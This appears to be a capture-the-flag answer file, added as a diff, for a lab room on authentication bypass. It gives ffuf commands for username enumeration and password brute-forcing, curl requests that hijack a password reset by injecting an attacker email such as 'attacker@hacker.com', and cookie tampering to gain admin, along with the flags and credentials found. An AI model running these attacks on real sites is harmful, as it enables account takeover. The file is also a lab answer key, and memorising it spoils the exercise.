@@ -1,0 +1,46 @@
+///TASK 2///
+===
+Q: What is the username starting with si*** ?
+** ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.129.104/customers/signup -mr "username already exists" 
+A: simon
+===
+Q: What is the username starting with st*** ?
+** #same as above#
+A: steve
+===
+Q: What is the username starting with ro**** ?
+** #same as above#
+A: robert
+===
+///TASK 3///
+===
+Q: What is the valid username and password (format: username/password)?
+** ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.129.104/customers/login -fc 200
+A: steve/thunder
+///TASK 4///
+Q:
+** RUN >> curl 'http://10.10.129.104/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+** RUN curl 'http://10.10.129.104/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+Visit website, create new account (for me: test) and new email address: (for me:test@customer.acmeitsupport.thm) then run below command
+** curl 'http://10.10.129.104/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm'
+A: THM{AUTH_BYPASS_COMPLETE} 
+===
+Q: What is the flag from changing the plain text cookie values?
+** curl -H "Cookie: logged_in=true; admin=true" http://10.10.129.104/cookie-test
+A: THM{COOKIE_TAMPERING}
+===
+Q: What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
+** https://md5hashing.net/hash/md5 >> Recerse md5
+A: 463729
+===
+Q: What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
+** Cyberchef > from base 64
+A: THM{BASE64_ENCODING}
+===
+Q: Encode the following value using base64 {"id":1,"admin":true}
+** CyberChef > to base64
+A: eyJpZCI6MSwiYWRtaW4iOnRydWV9
+===
+
+
+
